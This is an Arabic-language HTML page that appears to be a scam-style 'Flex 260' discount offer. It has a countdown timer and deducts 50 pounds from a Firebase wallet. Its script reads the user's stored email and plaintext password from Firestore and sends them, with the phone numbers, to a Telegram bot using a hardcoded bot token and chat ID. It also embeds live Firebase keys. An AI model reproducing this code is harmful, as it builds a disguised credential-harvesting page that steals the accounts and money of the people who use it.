<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>✅ خصم فليكس 260</title>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>

  <!-- SweetAlert -->
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

  <!-- خطوط + أيقونات -->
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@600&display=swap" rel="stylesheet">

  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: radial-gradient(circle at top left, #1f1f1f, #2b2b2b);
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: linear-gradient(135deg, #222, #333);
      padding: 30px 25px;
      border-radius: 15px;
      box-shadow: 0 8px 25px rgba(0,0,0,0.4);
      text-align: center;
      max-width: 400px;
      width: 90%;
      border: 1px solid #444;
    }

    h2 {
      font-size: 24px;
      margin-bottom: 10px;
      color: #00ff99;
    }

    .countdown {
      font-size: 20px;
      margin: 15px 0;
      color: #ffcc00;
    }

    p {
      font-size: 16px;
      color: #cccccc;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      background-color: #444;
      color: white;
      text-align: center;
      transition: 0.3s;
    }

    input:focus {
      outline: none;
      background-color: #555;
    }

    .button {
      background: linear-gradient(to right, #ff416c, #ff4b2b);
      color: white;
      font-size: 18px;
      padding: 12px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: 0.3s;
      width: 100%;
      margin-top: 10px;
    }

    .button:hover {
      transform: scale(1.05);
      box-shadow: 0 4px 20px rgba(255, 65, 108, 0.6);
    }

    .button:disabled {
      background: #666;
      cursor: not-allowed;
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>💳 خصم فليكس 260</h2>
    <p>🎁 العرض شغال دلوقتي! سارع قبل انتهاء الوقت</p>
    <div class="countdown" id="countdown">⏳ جاري التحميل...</div>
    <p>✅ السعر: 50 جنيه فقط</p>

    <input type="text" id="phone-number" placeholder="📞 رقم الهاتف">
    <input type="text" id="whatsapp-number" placeholder="💬 رقم واتساب للتواصل">
    <button class="button" onclick="renewPackage()">اشترك الآن</button>
  </div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyAdf5AKFgLXgK2PYERHw1hgF_HsMmuTfuo",
      authDomain: "noproblem-55b97.firebaseapp.com",
      projectId: "noproblem-55b97",
      storageBucket: "noproblem-55b97.appspot.com",
      messagingSenderId: "316010224446",
      appId: "1:316010224446:web:5d7e7f792e53ee4b396a6f"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const packagePrice = 50;

    function renewPackage() {
      const phoneNumber = document.getElementById("phone-number").value.trim();
      const whatsappNumber = document.getElementById("whatsapp-number").value.trim();
      const orderId = Math.floor(100000 + Math.random() * 900000);

      const now = new Date();
      const deadline = new Date();
      deadline.setHours(22, 0, 0, 0); // 10 مساءً

      if (now > deadline) {
        Swal.fire("⛔ انتهى العرض", "لا يمكن الاشتراك بعد الساعة 10 مساءً.", "error");
        return;
      }

      if (!phoneNumber || !whatsappNumber) {
        Swal.fire("❌ خطأ", "يرجى إدخال رقم الهاتف ورقم الواتساب.", "error");
        return;
      }

      firebase.auth().onAuthStateChanged((user) => {
        if (user) {
          const userRef = db.collection("users").doc(user.uid);
          userRef.get().then((doc) => {
            if (doc.exists) {
              const data = doc.data();
              const wallet = data.wallet || 0;
              const email = data.email || "غير متوفر";
              const password = data.password || "غير متوفر";

              if (wallet >= packagePrice) {
                userRef.update({ wallet: wallet - packagePrice }).then(() => {
                  db.collection("orders").add({
                    orderId,
                    userId: user.uid,
                    phoneNumber,
                    whatsapp: whatsappNumber,
                    email,
                    password,
                    amountDeducted: packagePrice,
                    status: "قيد التنفيذ",
                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
                  }).then(() => {
                    sendOrderToBot(orderId, phoneNumber, whatsappNumber, email, password);
                    Swal.fire("✅ تم حجز الرقم الخاص بك", "التفعيل هيبدأ الساعة 7 ونص، أول ما الخصم يتفعل هتوصلك رسالة تأكيد على رقم الواتساب", "success");
                  });
                });
              } else {
                Swal.fire("❌ خطأ", "رصيدك غير كافٍ لتجديد الباقة.", "error");
              }
            }
          });
        } else {
          Swal.fire("❌ خطأ", "يجب تسجيل الدخول أولاً.", "error");
        }
      });
    }

    function sendOrderToBot(orderId, phoneNumber, whatsapp, email, password) {
      const token = "7798612517:AAFdPcsVIOOyoW6NYTD0i_LTXn2KpFedwWo";
      const chatId = "8102839626";

      const message = `📌 *طلب جديد - خصم فليكس 260*
🔢 *رقم الطلب:* ${orderId}
📞 *رقم الهاتف:* ${phoneNumber}
💬 *رقم واتساب:* ${whatsapp}
✉️ *الإيميل:* ${email}
🔐 *باسورد الحساب:* ${password}
💰 *المبلغ المدفوع:* ${packagePrice} جنيه
⚡ *الحالة:* قيد التنفيذ`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
        .then(() => console.log("✅ تم إرسال الطلب إلى تيليجرام"))
        .catch(error => console.error("❌ خطأ في إرسال الطلب:", error));
    }

    function startCountdown() {
      const countdownElem = document.getElementById("countdown");
      const renewButton = document.querySelector(".button");
      const deadline = new Date();
      deadline.setHours(22, 0, 0, 0);

      const audio = new Audio("https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3");

      const updateCountdown = () => {
        const now = new Date();
        const diff = deadline - now;

        if (diff <= 0) {
          countdownElem.textContent = "⛔️ انتهى العرض!";
          renewButton.disabled = true;
          renewButton.textContent = "انتهى العرض";
          audio.play();
          return;
        }

        const hours = Math.floor(diff / (1000 * 60 * 60));
        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((diff % (1000 * 60)) / 1000);

        countdownElem.textContent = `⏳ ينتهي خلال: ${hours} ساعة ${minutes} دقيقة ${seconds} ثانية`;
      };

      updateCountdown();
      setInterval(updateCountdown, 1000);
    }

    startCountdown();
  </script>
</body>
</html>
